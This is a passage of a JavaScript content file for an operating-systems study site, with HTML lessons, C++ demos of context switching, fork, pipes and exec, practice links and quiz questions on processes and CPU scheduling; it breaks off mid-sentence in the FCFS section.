const OS_CONTENT = {
  id: 'os', t: 'Operating Systems',
  tabs: [
    // ===== TAB: PROCESSES =====
    {
      id: 'proc', t: 'Processes',
      topics: [
        // ----- Topic 0: Process States, PCB & Context Switch -----
        {
          t: 'Process States, PCB & Context Switch',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Imagine you open 50 browser tabs, a music player, and a code editor simultaneously on your laptop. The operating system must track each application\'s execution state, swap between them thousands of times per second, and ensure that pausing one application to run another does not corrupt either\'s data. Process states, the PCB, and context switching are the mechanisms that make this illusion of simultaneous execution possible.</p></div><div class="learn-section"><div class="learn-h">What is a Process?</div><p class="learn-p">A <b>process</b> is a program in execution. While a program is a passive entity stored on disk (an executable file), a process is an <b>active entity</b> with a program counter, a set of associated resources, and a current state. Each process has its own address space comprising the <b>text segment</b> (code), <b>data segment</b> (global variables), <b>heap</b> (dynamically allocated memory), and <b>stack</b> (temporary data such as function parameters, return addresses, and local variables).</p><p class="learn-p">When you launch an application, the OS creates a process by loading the executable into memory, allocating resources, and initializing a <b>Process Control Block (PCB)</b>.</p></div><div class="learn-section"><div class="learn-h">Process States</div><p class="learn-p">During its lifetime, a process transitions through several states. The <b>five-state model</b> is the most commonly used:</p><ol class="learn-list"><li><b>New</b> &mdash; The process is being created. The OS allocates a PCB and resources.</li><li><b>Ready</b> &mdash; The process is loaded in main memory and is waiting to be assigned to a CPU. It is in the <b>ready queue</b>.</li><li><b>Running</b> &mdash; The process\'s instructions are currently being executed by the CPU. On a single-core system, only one process can be in this state at a time.</li><li><b>Waiting (Blocked)</b> &mdash; The process is waiting for some event to occur (e.g., I/O completion, signal reception). It cannot proceed until the event happens.</li><li><b>Terminated</b> &mdash; The process has finished execution. The OS deallocates its resources and removes the PCB.</li></ol><p class="learn-p">Key transitions:</p><ul class="learn-list"><li><b>New &rarr; Ready:</b> Admitted by the long-term scheduler.</li><li><b>Ready &rarr; Running:</b> Dispatched by the short-term (CPU) scheduler.</li><li><b>Running &rarr; Ready:</b> Interrupted (e.g., time quantum expires in preemptive scheduling).</li><li><b>Running &rarr; Waiting:</b> Process issues an I/O request or waits for an event.</li><li><b>Waiting &rarr; Ready:</b> The event the process was waiting for completes.</li><li><b>Running &rarr; Terminated:</b> Process finishes execution or is killed.</li></ul><div class="learn-tip"><b>Tip:</b> In interview questions, remember that a process in the <b>Waiting</b> state cannot directly move to <b>Running</b>. It must first transition to <b>Ready</b> and then be scheduled.</div></div><div class="learn-section"><div class="learn-h">Process Control Block (PCB)</div><p class="learn-p">The <b>PCB</b> (also called Task Control Block) is a data structure maintained by the OS for every process. It is the repository of all information needed to manage the process. The PCB contains:</p><table class="learn-table"><tr><th>Field</th><th>Description</th></tr><tr><td>Process ID (PID)</td><td>Unique identifier for the process</td></tr><tr><td>Process State</td><td>Current state (New, Ready, Running, Waiting, Terminated)</td></tr><tr><td>Program Counter (PC)</td><td>Address of the next instruction to execute</td></tr><tr><td>CPU Registers</td><td>Contents of all process-centric registers (accumulator, stack pointer, general-purpose registers)</td></tr><tr><td>CPU Scheduling Info</td><td>Priority, pointers to scheduling queues</td></tr><tr><td>Memory Management Info</td><td>Page tables, segment tables, base/limit registers</td></tr><tr><td>Accounting Info</td><td>CPU time used, time limits, process numbers</td></tr><tr><td>I/O Status Info</td><td>List of I/O devices allocated, list of open files</td></tr></table><div class="learn-code">// Simplified PCB structure in C\nstruct PCB {\n    int pid;\n    int state;           // NEW, READY, RUNNING, WAITING, TERMINATED\n    int program_counter;\n    int registers[16];   // General-purpose registers\n    int priority;\n    struct PageTable *page_table;\n    struct FileDesc *open_files;\n    struct PCB *next;    // Pointer for queue linkage\n};</div></div><div class="learn-section"><div class="learn-h">Context Switch</div><p class="learn-p">A <b>context switch</b> occurs when the CPU switches from executing one process to another. This is the mechanism that enables multitasking. The steps involved are:</p><ol class="learn-list"><li>An interrupt or system call triggers the switch.</li><li>The OS <b>saves the context</b> (CPU registers, program counter, etc.) of the currently running process into its PCB.</li><li>The OS updates the state of the current process (Running &rarr; Ready or Running &rarr; Waiting).</li><li>The OS <b>selects a new process</b> from the ready queue using the CPU scheduling algorithm.</li><li>The OS <b>loads the context</b> of the selected process from its PCB into the CPU registers.</li><li>The OS updates the state of the new process (Ready &rarr; Running) and transfers control to it.</li></ol><p class="learn-p"><b>Context switch time</b> is pure overhead &mdash; the system does no useful work during the switch. Typical context switch times range from 1&ndash;10 microseconds on modern hardware. The time depends on:</p><ul class="learn-list"><li>Memory speed and number of registers to save/restore</li><li>Hardware support (some CPUs have special instructions for fast context switching)</li><li>Whether the OS needs to flush the TLB (Translation Lookaside Buffer)</li></ul><div class="learn-warn"><b>Warning:</b> Context switching between processes is more expensive than between threads of the same process, because threads share the same address space (no TLB flush needed).</div><p class="learn-p"><b>Overhead factors:</b> Direct cost includes saving/restoring registers. Indirect costs include TLB and cache pollution &mdash; after a context switch, the new process may experience many cache misses because the cache now contains data from the previous process.</p></div><div class="learn-section"><div class="learn-h">System Calls &amp; Mode Switch</div><p class="learn-p">A <b>system call</b> is the interface between a user process and the OS kernel. When a process needs OS services (file I/O, process creation, memory allocation), it triggers a <b>mode switch</b> from <b>user mode</b> to <b>kernel mode</b> via a software interrupt (trap).</p><table class="learn-table"><tr><th>Aspect</th><th>User Mode</th><th>Kernel Mode</th></tr><tr><td>Privilege</td><td>Restricted &mdash; cannot access hardware or kernel memory</td><td>Full access to hardware, memory, and all instructions</td></tr><tr><td>Failure impact</td><td>Only the process crashes</td><td>Can crash the entire system</td></tr><tr><td>Code running</td><td>Application code</td><td>OS kernel code</td></tr></table><div class="learn-warn"><b>Warning:</b> A <b>mode switch</b> (user &harr; kernel) is NOT the same as a <b>context switch</b>. A mode switch happens within the same process (e.g., system call), costs ~1&ndash;2 &mu;s, and does not save/restore the full PCB. A context switch changes which process is running and costs 1&ndash;10 &mu;s.</div></div><div class="learn-section"><div class="learn-h">Schedulers &amp; Dispatcher</div><p class="learn-p">The OS uses three types of schedulers:</p><ul class="learn-list"><li><b>Long-term Scheduler (Job Scheduler):</b> Controls the degree of multiprogramming by deciding which processes are admitted from the job pool to the ready queue. It runs infrequently.</li><li><b>Short-term Scheduler (CPU Scheduler):</b> Selects from among the ready processes and allocates the CPU. It runs very frequently (every few milliseconds).</li><li><b>Medium-term Scheduler:</b> Handles <b>swapping</b> &mdash; temporarily removes processes from main memory to reduce the degree of multiprogramming, then reintroduces them later.</li></ul><p class="learn-p">The <b>Dispatcher</b> is the module that gives control of the CPU to the process selected by the short-term scheduler. It performs the actual context switch, switches to user mode, and jumps to the correct location in the program. The time the dispatcher takes is called <b>dispatch latency</b>.</p><div class="learn-tip"><b>Tip:</b> The scheduler <b>decides</b> which process runs next; the dispatcher <b>performs</b> the switch. Interviews often ask about this distinction, along with context switch overhead for processes vs. threads and TLB flushing.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Variation</th><th>Description</th><th>Where Used</th></tr><tr><td>5-State Model</td><td>New, Ready, Running, Waiting, Terminated</td><td>Standard OS textbook model</td></tr><tr><td>7-State Model</td><td>Adds Suspended-Ready and Suspended-Waiting for swapped-out processes</td><td>Systems with limited RAM &amp; swapping</td></tr><tr><td>Zombie State</td><td>Process terminated but PCB entry remains until parent reads exit status</td><td>Unix/Linux</td></tr><tr><td>Voluntary vs Involuntary Switch</td><td>Process yields CPU (yield/sleep) vs preempted by timer interrupt</td><td>Cooperative vs preemptive OS</td></tr></table><p class="learn-p">Modern Linux uses a <b>task_struct</b> (over 600 fields) instead of a simple PCB. It includes scheduling class, memory descriptor, filesystem info, signal handlers, and cgroup/namespace references for containers.</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Waiting to Running is INVALID:</b> A blocked process must always transition to Ready first, then be scheduled to Running.</li><li><b>Context switch cost is not constant:</b> It varies by hardware, TLB flush requirements, and cache pollution effects.</li><li><b>Confusing process state with scheduling queue:</b> A process in Waiting is on an I/O wait queue, NOT the ready queue.</li><li><b>PCB size matters:</b> Linux\'s task_struct is 6-8 KB, significant when switching thousands of times per second.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>Time Cost</th><th>Notes</th></tr><tr><td>Context switch (process)</td><td>1-10 &mu;s direct + cache effects</td><td>Requires TLB flush, register save/restore</td></tr><tr><td>Context switch (thread, same process)</td><td>0.5-5 &mu;s</td><td>No TLB flush, shared address space</td></tr><tr><td>Process creation (fork)</td><td>~100 &mu;s</td><td>Uses Copy-on-Write for efficiency</td></tr><tr><td>Thread creation</td><td>~10 &mu;s</td><td>~10x faster than process creation</td></tr><tr><td>PCB lookup</td><td><span class="learn-complexity">O(1)</span></td><td>Indexed by PID in a hash table or array</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between a program and a process?</b><br>A: A program is a passive entity (an executable file on disk). A process is an active entity with a program counter, stack, heap, and allocated resources. Multiple processes can run the same program simultaneously.</p><p class="learn-p"><b>Q2: Why can\'t a process in the Waiting state go directly to Running?</b><br>A: The Waiting state means the process is blocked on an event. When the event completes, the process moves to Ready, where the CPU scheduler decides when to dispatch it. Skipping Ready would bypass the scheduler.</p><p class="learn-p"><b>Q3: What is the difference between process and thread context switches?</b><br>A: Process switches require saving/restoring the full PCB including page table base register, triggering a TLB flush. Thread switches within the same process share the address space, so no TLB flush is needed, making them 2-5x faster.</p><p class="learn-p"><b>Q4: What are the indirect costs of a context switch?</b><br>A: Cache pollution is the biggest indirect cost. After a switch, the new process finds its data is not in the L1/L2/L3 caches, leading to many cold cache misses. The TLB also needs to be repopulated.</p><p class="learn-p"><b>Q5: How does the OS decide when to perform a context switch?</b><br>A: Switches are triggered by: (1) timer interrupts (preemptive scheduling), (2) I/O requests or system calls, (3) higher-priority process becoming ready, or (4) process termination.</p><p class="learn-p"><b>Q6: What is the role of the medium-term scheduler?</b><br>A: The medium-term scheduler manages swapping: it suspends processes by moving them from RAM to disk when memory is scarce, controlling the degree of multiprogramming and preventing thrashing.</p></div>',

          code: `// Context Switch Simulation in C++
// Demonstrates saving and restoring process context

#include <iostream>
#include <queue>
#include <cstring>
using namespace std;

struct Registers {
    int eax, ebx, ecx, edx;
    int esp, ebp;       // Stack and base pointers
    int eip;            // Instruction pointer (Program Counter)
    int eflags;
};

struct PCB {
    int pid;
    int state;          // 0=NEW, 1=READY, 2=RUNNING, 3=WAITING, 4=TERMINATED
    Registers regs;
    int priority;
};

// Simulated CPU state
Registers cpu;

// Save the current CPU state into the given PCB
void saveContext(PCB &proc) {
    memcpy(&proc.regs, &cpu, sizeof(Registers));
    proc.state = 1; // Mark as READY
    cout << "Saved context of PID " << proc.pid << endl;
}

// Restore the CPU state from the given PCB
void restoreContext(PCB &proc) {
    memcpy(&cpu, &proc.regs, sizeof(Registers));
    proc.state = 2; // Mark as RUNNING
    cout << "Restored context of PID " << proc.pid << endl;
}

// Perform a context switch from procA to procB
void contextSwitch(PCB &procA, PCB &procB) {
    cout << "--- Context Switch: PID " << procA.pid
         << " -> PID " << procB.pid << " ---" << endl;

    // Step 1: Save state of currently running process
    saveContext(procA);

    // Step 2: Restore state of next process
    restoreContext(procB);

    cout << "CPU now executing PID " << procB.pid << endl;
}

int main() {
    // Initialize two processes
    PCB p1 = {1, 2, {10, 20, 30, 40, 1000, 2000, 5000, 0}, 5};
    PCB p2 = {2, 1, {50, 60, 70, 80, 3000, 4000, 7000, 0}, 3};

    // P1 is currently running; load its context
    memcpy(&cpu, &p1.regs, sizeof(Registers));
    cout << "CPU starts with PID 1, EAX=" << cpu.eax << endl;

    // Timer interrupt triggers context switch
    contextSwitch(p1, p2);
    cout << "CPU now has EAX=" << cpu.eax << endl;

    // Switch back to P1
    contextSwitch(p2, p1);
    cout << "CPU now has EAX=" << cpu.eax << endl;

    return 0;
}`,
          problems: [
            ['Process States and Transitions', 'https://www.geeksforgeeks.org/states-of-a-process-in-operating-systems/', 'Easy'],
            ['Context Switching in OS', 'https://www.geeksforgeeks.org/context-switch-in-operating-system/', 'Medium'],
            ['Process Control Block', 'https://www.geeksforgeeks.org/process-table-and-process-control-block-pcb/', 'Easy'],
            ['Process Schedulers in OS', 'https://www.geeksforgeeks.org/process-schedulers-in-operating-system/', 'Easy'],
          ],
          mcqs: [
            {q: 'Which of the following transitions is NOT valid in a standard five-state process model?', o: ['Running to Ready', 'Waiting to Ready', 'Waiting to Running', 'Ready to Running'], a: 2},
            {q: 'During a context switch, which of the following is saved in the PCB of the outgoing process?', o: ['Only the program counter', 'Only general-purpose registers', 'All CPU registers, program counter, and process state', 'Only the stack pointer'], a: 2},
            {q: 'What is the primary reason context switching between processes is more expensive than between threads of the same process?', o: ['Processes have more registers to save', 'Processes require TLB flush and address space switch', 'Threads cannot be preempted', 'Processes use more CPU time'], a: 1},
            {q: 'Which scheduler controls the degree of multiprogramming?', o: ['Short-term scheduler', 'Long-term scheduler', 'Medium-term scheduler', 'Dispatcher'], a: 1},
            {q: 'Which of the following is NOT stored in the Process Control Block?', o: ['Program counter', 'CPU registers', 'Source code of the program', 'Process state'], a: 2},
            {q: 'What is the difference between a mode switch and a context switch?', o: ['They are the same thing', 'A mode switch changes user/kernel mode within the same process; a context switch changes the running process', 'A mode switch changes the running process; a context switch changes privilege level', 'A mode switch only happens during I/O'], a: 1},
            {q: 'What is the role of the dispatcher in process management?', o: ['It decides which process runs next', 'It performs the actual context switch and transfers CPU control to the selected process', 'It manages the job pool on disk', 'It handles swapping processes to disk'], a: 1},
          ],
        },
        // ----- Topic 1: Process Creation & IPC -----
        {
          t: 'Process Creation & IPC',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Every time you type a command in a Unix shell, the shell calls fork() to create a child process and exec() to replace it with the requested program. When you pipe commands together (e.g., <code>grep pattern file | sort | uniq -c</code>), the shell sets up pipes between child processes for IPC. Understanding process creation and IPC is fundamental to systems programming.</p></div><div class="learn-section"><div class="learn-h">Process Creation</div><p class="learn-p">In Unix/Linux, a new process is created using the <code>fork()</code> system call. The calling process becomes the <b>parent</b> and the new process is the <b>child</b>. After <code>fork()</code>, both parent and child execute concurrently from the instruction following the fork call.</p><div class="learn-code">pid_t pid = fork();\nif (pid == 0) {\n    // Child process\n    printf("I am the child, PID = %d\\n", getpid());\n} else if (pid &gt; 0) {\n    // Parent process\n    printf("I am the parent, child PID = %d\\n", pid);\n} else {\n    // fork failed\n    perror("fork");\n}</div><p class="learn-p">Key behaviors of <code>fork()</code>:</p><ul class="learn-list"><li>Returns <b>0</b> to the child process.</li><li>Returns the <b>child\'s PID</b> to the parent process.</li><li>Returns <b>-1</b> on failure.</li><li>The child gets a <b>copy</b> of the parent\'s address space (uses <b>Copy-on-Write</b> for efficiency).</li><li>The child inherits open file descriptors, signal handlers, and environment.</li></ul><div class="learn-tip"><b>Tip:</b> <b>Copy-on-Write (COW)</b> means the OS doesn\'t immediately duplicate the parent\'s memory pages. Both parent and child share the same physical pages (marked read-only). Only when either process writes to a page does the OS create a separate copy. This makes fork() very efficient.</div></div><div class="learn-section"><div class="learn-h">exec() Family of System Calls</div><p class="learn-p">After <code>fork()</code>, the child often calls one of the <code>exec()</code> family functions to replace its address space with a new program. The exec family includes <code>execl</code>, <code>execv</code>, <code>execle</code>, <code>execve</code>, <code>execlp</code>, and <code>execvp</code>.</p><div class="learn-code">// Child replaces itself with "ls -l"\npid_t pid = fork();\nif (pid == 0) {\n    execlp("ls", "ls", "-l", NULL);\n    // If exec returns, it failed\n    perror("exec failed");\n    exit(1);\n}</div><p class="learn-p">The <code>wait()</code> system call makes the parent block until one of its children terminates. <code>waitpid()</code> waits for a specific child.</p></div><div class="learn-section"><div class="learn-h">fork() Output Prediction</div><p class="learn-p">Predicting how many processes (or print statements) result from a sequence of fork() calls is one of the most frequently asked OS questions. The key rule: <b>each fork() doubles the number of executing processes</b>.</p><div class="learn-code">// Example 1: Three sequential forks\nfork(); // 1 process becomes 2\nfork(); // 2 processes become 4\nfork(); // 4 processes become 8\nprintf("hello\\n"); // Printed 8 times (2^3 = 8 processes)</div><div class="learn-code">// Example 2: Fork inside an if\npid_t pid = fork(); // 2 processes\nif (pid == 0) {\n    fork(); // Only child forks → now 3 total\n}\nprintf("hi\\n"); // Printed 3 times</div><div class="learn-code">// Example 3: Fork in a loop\nfor (int i = 0; i &lt; 3; i++) {\n    fork();\n}\n// Total processes = 2^3 = 8\n// printf here prints 8 times</div><p class="learn-p"><b>General rule:</b> With N sequential fork() calls where every process executes all of them, the total number of processes = <b>2<sup>N</sup></b>. If forks are conditional (inside if/else), trace the process tree carefully.</p><div class="learn-tip"><b>Tip:</b> When tracing fork() trees, draw a binary tree where each fork() creates a left branch (parent continues) and a right branch (new child). Count the leaf nodes to find how many processes exist at the end.</div></div><div class="learn-section"><div class="learn-h">Zombie and Orphan Processes</div><p class="learn-p">Two special process states arise from the parent-child relationship:</p><ul class="learn-list"><li><b>Zombie Process:</b> A process that has <b>terminated</b> but whose parent has not yet called <code>wait()</code> to read its exit status. The PCB entry remains in the process table. Zombies consume PID slots but no memory.</li><li><b>Orphan Process:</b> A process whose parent has terminated before it. The orphan is <b>adopted by init (PID 1)</b>, which periodically calls <code>wait()</code> to clean up.</li></ul><div class="learn-warn"><b>Warning:</b> A large number of zombie processes can exhaust the process table, preventing new processes from being created. Always ensure parents call <code>wait()</code> or install a <code>SIGCHLD</code> handler.</div></div><div class="learn-section"><div class="learn-h">Inter-Process Communication (IPC)</div><p class="learn-p">Since processes have <b>isolated address spaces</b>, they need special mechanisms to communicate. The main IPC methods are:</p><table class="learn-table"><tr><th>IPC Method</th><th>Description</th><th>Use Case</th></tr><tr><td>Pipes</td><td>Unidirectional byte stream between related processes</td><td>Shell pipelines (ls | grep)</td></tr><tr><td>Named Pipes (FIFOs)</td><td>Like pipes but accessible via the filesystem; works between unrelated processes</td><td>Client-server on same machine</td></tr><tr><td>Shared Memory</td><td>A region of memory mapped into multiple processes\' address spaces</td><td>High-throughput data sharing</td></tr><tr><td>Message Queues</td><td>Processes send/receive structured messages through the kernel</td><td>Asynchronous communication</td></tr><tr><td>Sockets</td><td>Communication endpoints supporting both local and network communication</td><td>Client-server, distributed systems</td></tr><tr><td>Signals</td><td>Asynchronous notifications sent to a process</td><td>Ctrl+C (SIGINT), kill commands</td></tr></table></div><div class="learn-section"><div class="learn-h">Pipes</div><p class="learn-p">A <b>pipe</b> provides a unidirectional communication channel. The <code>pipe()</code> system call creates two file descriptors: <code>fd[0]</code> for reading and <code>fd[1]</code> for writing.</p><div class="learn-code">int fd[2];\npipe(fd);\n\nif (fork() == 0) {\n    // Child: write to pipe\n    close(fd[0]);           // Close read end\n    write(fd[1], "Hello", 5);\n    close(fd[1]);\n} else {\n    // Parent: read from pipe\n    close(fd[1]);           // Close write end\n    char buf[10];\n    read(fd[0], buf, 5);\n    close(fd[0]);\n}</div></div><div class="learn-section"><div class="learn-h">Shared Memory</div><p class="learn-p"><b>Shared memory</b> is the <b>fastest IPC mechanism</b> because after the initial setup, data transfers do not involve the kernel. Both processes map the same physical memory region into their virtual address spaces. However, you must use synchronization (semaphores or mutexes) to prevent race conditions.</p><div class="learn-code">// POSIX shared memory\nint shm_fd = shm_open("/my_shm", O_CREAT | O_RDWR, 0666);\nftruncate(shm_fd, 4096);\nchar *ptr = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);\nsprintf(ptr, "Hello from Process A");\n// Process B can open the same shared memory and read it</div><div class="learn-tip"><b>Tip:</b> Shared memory vs. message passing is a classic interview question. Shared memory is faster but requires manual synchronization; message passing is easier to program but has kernel overhead for each message.</div></div><div class="learn-section"><div class="learn-h">Message Passing</div><p class="learn-p">In the <b>message-passing</b> model, processes communicate by sending and receiving messages through the kernel. This can be <b>direct</b> (naming the recipient explicitly) or <b>indirect</b> (through mailboxes/ports). Communication can be:</p><ul class="learn-list"><li><b>Blocking (synchronous):</b> Sender blocks until receiver receives; receiver blocks until a message is available.</li><li><b>Non-blocking (asynchronous):</b> Sender sends and continues; receiver gets a message or null.</li></ul><p class="learn-p">The <b>producer-consumer problem</b> is a classic example where one process produces data and another consumes it, using either shared memory with bounded buffers or message passing.</p></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>IPC Method</th><th>Speed</th><th>Direction</th><th>Relationship</th><th>Persistence</th></tr><tr><td>Pipe</td><td>Fast</td><td>Unidirectional</td><td>Parent-child</td><td>Process lifetime</td></tr><tr><td>Named Pipe (FIFO)</td><td>Fast</td><td>Unidirectional</td><td>Any</td><td>Until deleted</td></tr><tr><td>Shared Memory</td><td>Fastest</td><td>Bidirectional</td><td>Any</td><td>Explicit removal</td></tr><tr><td>Message Queue</td><td>Medium</td><td>Bidirectional</td><td>Any</td><td>Kernel managed</td></tr><tr><td>Socket</td><td>Medium</td><td>Bidirectional</td><td>Any (even networked)</td><td>Connection lifetime</td></tr><tr><td>Signal</td><td>Fast</td><td>Unidirectional</td><td>Any (with permission)</td><td>Instantaneous</td></tr></table><p class="learn-p"><b>vfork()</b> is a historical variant of fork() that shares the parent\'s address space with the child and suspends the parent until the child calls exec() or _exit().</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>fork() returns twice:</b> Once in the parent (child\'s PID) and once in the child (0). Forgetting to check the return value leads to both executing the same code path.</li><li><b>Zombie accumulation:</b> If a parent creates many children without calling wait(), zombie processes pile up. Always install a SIGCHLD handler or call waitpid().</li><li><b>exec() does not return on success:</b> The calling process\'s address space is completely replaced. If exec() returns, it failed.</li><li><b>Pipe deadlock:</b> If both ends of a pipe remain open in both processes, neither will see EOF. Always close unused ends.</li><li><b>Shared memory race conditions:</b> Shared memory provides no built-in synchronization. Without mutexes or semaphores, concurrent access produces data races.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>Typical Latency</th><th>Throughput</th></tr><tr><td>fork() with COW</td><td>~100 &mu;s</td><td>N/A</td></tr><tr><td>exec()</td><td>~500 &mu;s (includes loading binary)</td><td>N/A</td></tr><tr><td>Pipe transfer</td><td>~5 &mu;s per message</td><td>~1 GB/s</td></tr><tr><td>Shared memory</td><td>~100 ns (after setup)</td><td>Memory bandwidth</td></tr><tr><td>Unix domain socket</td><td>~10 &mu;s</td><td>~500 MB/s</td></tr><tr><td>TCP socket (loopback)</td><td>~50 &mu;s</td><td>~200 MB/s</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is Copy-on-Write and why is it important for fork()?</b><br>A: COW means the parent and child share the same physical pages after fork(), marked read-only. Only when either process writes to a page does the OS create a separate copy. This makes fork() extremely fast regardless of process size.</p><p class="learn-p"><b>Q2: What is the difference between a zombie process and an orphan process?</b><br>A: A zombie is a terminated child whose parent has not yet called wait(). An orphan is a running child whose parent has terminated; it is adopted by init (PID 1), which will eventually reap it.</p><p class="learn-p"><b>Q3: Why is shared memory the fastest IPC mechanism?</b><br>A: After initial setup (mmap/shm_open), data transfer happens through direct memory reads and writes with no kernel involvement. Pipes and message queues require system calls for each send/receive.</p><p class="learn-p"><b>Q4: When would you choose message passing over shared memory?</b><br>A: Message passing is preferred when: (1) processes are on different machines, (2) you want built-in synchronization, (3) the communication pattern is well-structured, or (4) you want to avoid manual synchronization complexity.</p><p class="learn-p"><b>Q5: What happens if you call exec() without fork() first?</b><br>A: The current process\'s address space is replaced by the new program. The original program ceases to exist. Usually fork() is called first so the original process continues running.</p><p class="learn-p"><b>Q6: How many processes are created by fork(); fork(); fork(); and why?</b><br>A: 8 total processes (2^3). Each fork() doubles the count: 1&rarr;2&rarr;4&rarr;8. Every process (parent and children) executes the subsequent fork() calls, so the number doubles at each step. Draw a binary tree to trace: each fork creates one new branch.</p></div>',

          code: `// Process Creation and IPC via Pipe in C++/C
// Demonstrates fork(), exec(), wait(), and pipe communication

#include <iostream>
#include <unistd.h>
#include <sys/wait.h>
#include <cstring>
using namespace std;

// Demonstrate fork() with multiple children
void forkDemo() {
    cout << "=== Fork Demo ===" << endl;
    for (int i = 0; i < 3; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            // Child process
            cout << "Child " << i << " (PID " << getpid()
                 << "), Parent PID: " << getppid() << endl;
            _exit(0); // Exit child immediately
        }
    }
    // Parent waits for all children
    for (int i = 0; i < 3; i++) {
        int status;
        pid_t finished = wait(&status);
        cout << "Child PID " << finished << " exited with status "
             << WEXITSTATUS(status) << endl;
    }
}

// Demonstrate IPC via pipe
void pipeDemo() {
    cout << "\\n=== Pipe IPC Demo ===" << endl;
    int pipefd[2];
    // pipefd[0] = read end, pipefd[1] = write end
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        // Child: write to pipe
        close(pipefd[0]); // Close unused read end
        const char *msg = "Hello from child!";
        write(pipefd[1], msg, strlen(msg) + 1);
        close(pipefd[1]);
        _exit(0);
    } else {
        // Parent: read from pipe
        close(pipefd[1]); // Close unused write end
        char buffer[256];
        ssize_t bytesRead = read(pipefd[0], buffer, sizeof(buffer));
        if (bytesRead > 0) {
            cout << "Parent received: " << buffer << endl;
        }
        close(pipefd[0]);
        wait(NULL); // Wait for child to finish
    }
}

// Demonstrate fork + exec
void execDemo() {
    cout << "\\n=== Fork + Exec Demo ===" << endl;
    pid_t pid = fork();
    if (pid == 0) {
        // Child: replace with 'echo' command
        execlp("echo", "echo", "Executed by child via exec!", NULL);
        perror("exec failed"); // Only reached if exec fails
        _exit(1);
    } else {
        wait(NULL);
        cout << "Child finished executing external program." << endl;
    }
}

int main() {
    forkDemo();
    pipeDemo();
    execDemo();
    return 0;
}`,
          problems: [
            ['Fork System Call Practice', 'https://www.geeksforgeeks.org/fork-system-call/', 'Easy'],
            ['IPC using Pipes', 'https://www.geeksforgeeks.org/pipe-system-call/', 'Medium'],
            ['Zombie and Orphan Processes', 'https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/', 'Medium'],
            ['Shared Memory IPC', 'https://www.geeksforgeeks.org/posix-shared-memory-api/', 'Hard'],
            ['Inter Process Communication', 'https://www.geeksforgeeks.org/inter-process-communication-ipc/', 'Medium'],
          ],
          mcqs: [
            {q: 'What value does fork() return to the child process on success?', o: ['The child\'s PID', '0', '-1', 'The parent\'s PID'], a: 1},
            {q: 'Which IPC mechanism is the fastest because it avoids kernel involvement during data transfer?', o: ['Pipes', 'Message Queues', 'Shared Memory', 'Sockets'], a: 2},
            {q: 'What happens to an orphan process in Unix?', o: ['It becomes a zombie', 'It is terminated immediately', 'It is adopted by the init process (PID 1)', 'It remains in the waiting state forever'], a: 2},
            {q: 'What does Copy-on-Write (COW) optimize in the fork() system call?', o: ['CPU register saving', 'Memory page duplication', 'File descriptor sharing', 'Signal handler setup'], a: 1},
            {q: 'Which statement is true about zombie processes?', o: ['They consume significant memory resources', 'They are adopted by the init process', 'Their PCB remains until the parent calls wait()', 'They continue executing in the background'], a: 2},
            {q: 'How many times will "hello" be printed by this code: fork(); fork(); printf("hello");', o: ['2', '3', '4', '8'], a: 2},
            {q: 'After fork(), the child process inherits all of the following EXCEPT:', o: ['Open file descriptors', 'The PID of the parent', 'Signal handlers', 'Environment variables'], a: 1},
          ],
        },
      ],
    },

    // ===== TAB: CPU SCHEDULING =====
    {
      id: 'sched', t: 'CPU Scheduling',
      topics: [
        // ----- Topic 0: FCFS & SJF Scheduling -----
        {
          t: 'FCFS & SJF Scheduling',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Consider a print queue where a 500-page job arrives before three 1-page jobs. Under FCFS, the small jobs wait over an hour for the large job to finish &mdash; this is the <b>convoy effect</b>. SJF solves this by prioritizing shorter jobs, but requires knowing job lengths in advance. Understanding these trade-offs is essential for designing responsive systems.</p></div><div class="learn-section"><div class="learn-h">CPU Scheduling Basics</div><p class="learn-p">The <b>CPU scheduler</b> selects a process from the ready queue and allocates the CPU to it. The goal is to maximize CPU utilization and throughput while minimizing turnaround time, waiting time, and response time.</p><p class="learn-p">Key metrics for evaluating scheduling algorithms:</p><table class="learn-table"><tr><th>Metric</th><th>Definition</th></tr><tr><td>Turnaround Time (TAT)</td><td>Completion Time - Arrival Time</td></tr><tr><td>Waiting Time (WT)</td><td>Turnaround Time - Burst Time</td></tr><tr><td>Response Time</td><td>First response - Arrival Time</td></tr><tr><td>Throughput</td><td>Number of processes completed per unit time</td></tr><tr><td>CPU Utilization</td><td>Percentage of time the CPU is busy</td></tr></table><p class="learn-p">Scheduling can be <b>preemptive</b> (a running process can be interrupted and moved to the ready queue) or <b>non-preemptive</b> (once the CPU is allocated, the process keeps it until it terminates or blocks).</p></div><div class="learn-section"><div class="learn-h">First Come First Served (FCFS)</div><p class="learn-p"><b>FCFS</b> is the simplest scheduling algorithm. Processes are executed in the order they arrive in the ready queue. It is <b>non-preemptive</b>.</p><p class="learn-p"><b>Example:</b></p><table class="learn-table"><tr><th>Process</th><th>Arrival Time</th><th>Burst Time</th></tr><tr><td>P1</td><td>0</td><td>24</td></tr><tr><td>P2</td><td>1</td><td>3</td></tr><tr><td>P3</td><td>2</td><td>3</td></tr></table><p class="learn-p">Gantt chart: <code>|--P1(0-24)--|--P2(24-27)--|--P3(27-30)--|</code></p><ul class="learn-list"><li>Waiting Times: P1=0, P2=24-1=23, P3=27-2=25</li><li>Average Waiting Time = (0+23+25)/3 = <b>16.0</b></li></ul><div class="learn-warn"><b>Warning:</b> FCFS suffers from 